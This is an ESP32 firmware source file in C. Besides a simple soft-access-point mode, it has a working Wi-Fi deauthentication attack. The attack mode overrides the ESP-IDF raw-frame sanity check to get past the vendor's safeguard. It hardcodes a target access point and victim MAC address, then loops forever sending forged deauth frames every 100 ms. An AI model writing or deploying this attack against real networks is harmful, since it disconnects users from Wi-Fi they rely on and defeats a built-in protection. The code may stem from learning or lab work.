#include "define.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "nvs_flash.h"
#include "esp_system.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"

#ifdef AP
static const char *TAG = "AP";
#include "softAP.h"
void print_softap_bssid(void);
void app_main() { 
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    wifi_init_softap();
    print_softap_bssid();
}

void print_softap_bssid(void) {
    wifi_config_t wifi_config;
    ESP_ERROR_CHECK(esp_wifi_get_config(WIFI_IF_AP, &wifi_config));
    
    uint8_t mac[6];
    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_AP, mac));
    
    ESP_LOGE(TAG, "SoftAP BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}
#endif

#ifdef ATTACK
#define WIFI_MODE WIFI_IF_AP
static const char *TAG = "deauth attack";

//bypass espidf safety sanity check
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

uint8_t deauth_frame_default[26] = {
    0xc0, 0x00, 
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]);

void app_main() {
    // Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize Wi-Fi
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    //access point BSSID = 7c:df:a1:de:e2:95
    uint8_t bssid[6] = {0x7c, 0xdf, 0xa1, 0xde, 0xe2, 0x95};
    //device being attacked MAC address =   4e:88:05:2f:f7:b5
    uint8_t mac[6] = {0x4e, 0x88, 0x05, 0x2f, 0xf7, 0xb5};

    while(1)
    {
       sendDeauthFrame(bssid, 1, mac);// Send deauth frame on channel 1
       vTaskDelay(pdMS_TO_TICKS(100));
    }
      
}

void sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  ESP_ERROR_CHECK(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
  vTaskDelay(1);

  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];

  // Send packet
  ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_MODE, deauth_frame_default, sizeof(deauth_frame_default), true));
  
  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_MODE, deauth_frame_default, sizeof(deauth_frame_default), true));

  ESP_LOGI(TAG, "attack sent");
}
#endif